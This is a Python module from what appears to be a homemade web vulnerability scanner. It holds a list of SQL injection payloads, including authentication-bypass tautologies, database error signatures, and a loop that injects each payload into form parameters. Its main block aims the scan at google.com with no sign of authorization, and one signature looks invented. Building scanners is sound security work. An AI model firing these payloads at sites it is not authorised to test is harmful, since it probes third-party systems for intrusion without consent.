from scanner import extract_target_inputs
import requests
from urllib.parse import urlparse

# 1. Safe SQL Injection Payloads List (Non-Destructive)
SQLI_PAYLOADS = [
    "'",                          # Standard single quote logic break
    "\"",                         # Double quote logic break
    "1' OR '1'='1",              # Tautology authentication bypass
    "' OR 1=1 --",               # Comment injection for SQL databases
    "' OR 'a'='a",                # Character comparison payload
    "admin' --",                  # Username guessing entry
    "') OR ('1'='1"               # Brackets handling injection
]

# 2. Database Error Signatures (OWASP Standard Signature Matching)
# Agar response HTML mein inmein se koi text mila, to SQL Injection confirm ho jayega.
SQL_ERROR_SIGNATURES = {
    "MySQL": [
        "you have an error in your sql syntax",
        "warning: mysql_",
        "valid mysql result",
        "myodbc error windows"
    ],
    "PostgreSQL": [
        "postgresql query failed",
        "pg_rack_routing error",
        "pg_exec failed",
        "severity: error"
    ],
    "Microsoft SQL Server": [
        "unclosed quotation mark after the character string",
        "driver microsoft sql server",
        "ole db provider for sql server"
    ],
    "Oracle": [
        "oracle error",
        "ora-00933",
        "oracle odbc driver",
        "microsoft oledb provider for oracle"
    ]
}

def scan_parameter_for_sqli(target_url, param_name):
    print(f"\n[SQLi MODULE]: Testing Parameter [{param_name}] on target...")
    headers = {"User-Agent": "Mozilla/5.0 AegisVM-Scanner/1.0"}
    
    # Har payload ko test field mein daal kar check karna
    for payload in SQLI_PAYLOADS:
        # URL parameters modify karna (e.g., ://test.com)
        test_params = {param_name: payload}
        
        try:
            response = requests.get(target_url, params=test_params, headers=headers, timeout=10)
            html_content = response.text.lower()
            
            # Response ko signatures se match karna
            for db_type, errors in SQL_ERROR_SIGNATURES.items():
                for error in errors:
                    if error in html_content:
                        print(f"  [CRITICAL ALERT]: SQL Injection Detected!")
                        print(f"  ├── DB Technology: {db_type}")
                        print(f"  ├── Vulnerable Param: [{param_name}]")
                        print(f"  └── Payload Used: {payload}")
                        return True
                        
        except Exception as e:
            print(f"  [ERROR]: Network issue while checking payload {payload}: {e}")
            continue
            
    print(f"  [SAFE]: Parameter [{param_name}] is secure against standard error-based SQLi.")
    return False

if __name__ == "__main__":
    # Real Integration Test
    # Hamara tool pehle Google ke forms extract karega aur phir unpar SQLi test chalaye ga
    target_site = "https://google.com"
    
    # Step A: Run Week 2 Scanner to get all input forms automatically
    detected_forms = extract_target_inputs(target_site)
    
    # Step B: Loop through all detected forms and test each parameter
    print("\n[MASTER ENGINE]: Passing scanned forms to SQLi Module...")
    for form in detected_forms:
        endpoint = form["action_url"]
        for param in form["inputs"]:
            # Extract name of the input field (like 'q' for google search)
            param_name = param["name"]
            
            # Run our SQLi injection engine on this exact field
            scan_parameter_for_sqli(endpoint, param_name)
